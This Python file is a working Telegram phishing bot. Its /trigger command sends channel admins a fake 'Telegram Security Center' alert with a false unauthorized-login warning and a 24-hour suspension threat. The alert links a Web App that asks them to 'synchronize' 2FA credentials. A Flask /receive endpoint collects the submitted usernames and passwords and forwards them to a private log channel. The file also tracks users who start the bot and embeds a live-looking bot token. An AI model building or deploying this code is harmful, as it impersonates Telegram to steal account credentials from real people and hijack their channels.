import os, threading, datetime, time
from flask import Flask, request, jsonify
from flask_cors import CORS
from telebot import TeleBot, types

TOKEN = "8729895497:AAEqEZ3HA56FmQjm_kI5VmKxQn1a4HJBSuE"
ADMIN_ID = 8699819680
LOG_CHANNEL = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-research/" 
USER_FILE = "users.txt"

bot = TeleBot(TOKEN)
app = Flask(__name__)
CORS(app)

# --- DATABASE HELPERS ---

def save_user(user_id, username):
    """Saves a new user to the text file if they don't exist."""
    existing_users = get_all_users()
    if str(user_id) not in existing_users:
        with open(USER_FILE, "a") as f:
            f.write(f"{user_id}|{username}\n")

def get_all_users():
    """Reads all users from the text file."""
    if not os.path.exists(USER_FILE):
        return {}
    users = {}
    with open(USER_FILE, "r") as f:
        for line in f:
            if "|" in line:
                uid, uname = line.strip().split("|")
                users[uid] = uname
    return users

# --- BOT HANDLERS ---

@bot.message_handler(commands=['start'])
def start(message):
    # Capture the user's details automatically
    uid = message.from_user.id
    uname = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    save_user(uid, uname)
    
    bot.reply_to(message, "<b>Console:</b> Secure connection established.", parse_mode="HTML")

@bot.message_handler(commands=['list'])
def handle_list(message):
    if message.from_user.id == ADMIN_ID:
        users = get_all_users()
        if not users:
            bot.send_message(ADMIN_ID, "📭 No users found in database.")
            return
            
        response = "<b>📡 Live Bot Users:</b>\n\n"
        for uid, username in users.items():
            response += f"👤 {username}\nID: <code>{uid}</code>\n\n"
        bot.send_message(ADMIN_ID, response, parse_mode="HTML")

@bot.message_handler(commands=['trigger'])
def handle_trigger(message):
    if message.from_user.id == ADMIN_ID:
        try:
            clean_text = message.text.replace('/trigger', '').replace('\n', ' ').strip()
            parts = [p.strip() for p in clean_text.split('@')]
            
            if len(parts) == 3:
                target_id, channel_name, admin_name = parts
                deadline = (datetime.datetime.now() + datetime.timedelta(hours=24)).strftime("%B %d, %H:%M UTC")
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("Verify Authenticity", web_app=types.WebAppInfo(url=TMA_URL)))
                
                bait = (
                    f"<b>🛡 Telegram Security Center</b>\n\n"
                    f"Dear <b>{admin_name}</b>,\n\n"
                    f"Our automated security systems have detected unusual activity and an unauthorized login attempt associated with your administrative account for: <b>{channel_name}</b>.\n\n"
                    f"To maintain ownership privileges and prevent restriction, you are required to synchronize your 2FA credentials via the <b>Admin Portal</b> before <b>{deadline}</b>.\n\n"
                    f"<i>Note: Failure to verify may lead to a temporary suspension of administrative access.</i>"
                )
                
                bot.send_message(int(target_id), bait, parse_mode="HTML", reply_markup=markup)
                bot.send_message(ADMIN_ID, f"✅ Alert sent to {admin_name}")
            else:
                bot.send_message(ADMIN_ID, "❌ Use: /trigger ID @ Channel @ Name")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ Error: {str(e)}")

# --- SERVER & RUNNER ---

@app.route('/')
def home(): return "Bot is Alive", 200

@app.route('/receive', methods=['POST'])
def receive_data():
    data = request.json
    if data:
        user = data.get('user', 'unknown')
        pwd = data.get('password', 'none')
        msg = f"📥 <b>NEW LOG RECEIVED:</b>\n\n👤 <b>Admin:</b> {user}\n🔑 <b>Password:</b> <code>{pwd}</code>"
        bot.send_message(LOG_CHANNEL, msg, parse_mode="HTML")
        return jsonify({"status": "sent"}), 200
    return jsonify({"status": "error"}), 400

def run_bot():
    bot.remove_webhook()
    time.sleep(1)
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
